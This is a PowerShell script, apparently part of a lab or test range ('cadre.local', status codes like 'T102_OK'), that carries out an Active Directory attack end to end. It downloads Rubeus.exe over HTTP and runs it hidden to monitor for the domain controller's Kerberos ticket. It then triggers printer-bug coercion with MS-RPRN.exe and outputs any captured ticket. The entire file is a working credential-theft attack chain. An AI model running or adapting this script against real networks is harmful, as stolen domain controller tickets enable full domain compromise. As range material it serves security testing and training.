[CmdletBinding()]
param(
    [string]$TargetDC = "dc02.child.cadre.local",
    [string]$Listener = "mbr01.child.cadre.local"
)
$ErrorActionPreference = "Stop"
try {
    $outDir = "C:\Tools\cadre-attack"
    New-Item -ItemType Directory -Path $outDir -Force | Out-Null

    $rubeus = "$outDir\Rubeus.exe"
    $msrprn = "C:\Tools\ADTools\MS-RPRN.exe"
    if (-not (Test-Path $msrprn)) { throw "MS-RPRN.exe not found at $msrprn" }

    # Stage Rubeus from provisioning HTTP server if missing
    if (-not (Test-Path $rubeus)) {
        Invoke-WebRequest -Uri "http://192.168.77.60:8888/Rubeus.exe" -OutFile $rubeus -UseBasicParsing
    }

    $output = "$outDir\dc02_tgs.txt"
    if (Test-Path $output) { Remove-Item $output -Force }

    # Build a command file to start Rubeus monitor in background
    $cmdFile = "$outDir\start_monitor.cmd"
    "@echo off`r`nstart /B `"$rubeus`" monitor /targetuser:DC02$ /interval:5 /filtername:DC02$ /output:`"$output`"" | Out-File -FilePath $cmdFile -Encoding ASCII

    # Start monitor
    Start-Process -FilePath "cmd.exe" -ArgumentList "/c $cmdFile" -WindowStyle Hidden
    Start-Sleep -Seconds 2

    # Trigger coercion
    & $msrprn "\\$TargetDC" "\\$Listener" 2>&1 | Out-Null

    Start-Sleep -Seconds 6

    # Stop monitor
    Get-Process -Name Rubeus -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue

    if (Test-Path $output) {
        $content = Get-Content $output -Raw
        if ($content -and $content.Contains("KIRBI")) {
            Write-Output "T102_OK: captured DC02$ TGS on mbr01"
            Write-Output $content
        } else {
            Write-Output "T102_INFO: no KIRBI captured yet"
            if ($content) { Write-Output $content }
        }
    } else {
        Write-Output "T102_INFO: no output file yet"
    }
} catch {
    Write-Output ("T102_FAIL: " + $_.Exception.Message)
    exit 1
}
